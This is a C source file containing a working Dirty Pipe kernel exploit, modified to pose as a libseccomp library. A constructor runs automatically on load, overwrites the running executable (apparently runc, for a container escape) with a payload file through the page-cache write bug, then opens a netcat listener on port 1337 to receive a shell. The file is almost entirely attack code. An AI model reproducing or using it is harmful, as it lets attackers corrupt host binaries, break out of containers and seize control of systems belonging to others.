/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 * modified: @jpts
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/signal.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 65536
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[PAGE_SIZE];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}



int writepage(int fd, u_int8_t *data, size_t data_size, signed long offset) {

        if (offset % PAGE_SIZE == 0) {
                fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
                return EXIT_FAILURE;
        }

        //const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
        const loff_t end_offset = offset + (loff_t)data_size;
        /*if (end_offset > next_page) {
                fprintf(stderr, "Sorry, cannot write across a page boundary (%ld>%ld)\n",end_offset,next_page);
                return EXIT_FAILURE;
        }*/

        struct stat st;
        if (fstat(fd, &st)) {
                perror("stat failed");
                return EXIT_FAILURE;
        }

        if (offset > st.st_size) {
                fprintf(stderr, "Offset is not inside the file\n");
                return EXIT_FAILURE;
        }

        if (end_offset > st.st_size) {
                fprintf(stderr, "Sorry, cannot enlarge the file (%ld/%ld)\n",end_offset,st.st_size);
                return EXIT_FAILURE;
        }

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		fprintf(stderr,"splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		fprintf(stderr,"write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}

        return 0;
}

int initz(void)
{

	const char *target = "/proc/self/exe";
	const char *payload = "/runc_smoll";

        int fdp = open(payload, O_RDONLY);

        struct stat stp;
        if (fstat(fdp, &stp)) {
                fprintf(stderr,"stat failed");
                return EXIT_FAILURE;
        }

        u_int8_t *bytes = malloc(stp.st_size-1);
        lseek(fdp, 1, SEEK_SET);
        read(fdp, bytes, stp.st_size-1);
        close(fdp);


	const int fdt = open(target, O_RDONLY);
	if (fdt < 0) {
		fprintf(stderr,"open target failed");
		return EXIT_FAILURE;
	}

        struct stat stt;
        if (fstat(fdt, &stt)) {
                fprintf(stderr,"stat failed");
                return EXIT_FAILURE;
        }

        fprintf(stderr,"[+] writing payload\n");
        writepage(fdt, bytes, stp.st_size, 1);
        close(fdt);
        free(bytes);

        fprintf(stderr,"[+] waiting for shell...\n");
        system("/bin/nc -nvlp 1337");

        return EXIT_SUCCESS;
}

struct version {
    unsigned int major;
    unsigned int minor;
    unsigned int micro;
};

const struct version *seccomp_version(void)
{
    static struct version ver = {9,9,9};
    return &ver;
}

int __attribute__((constructor)) initz(void);
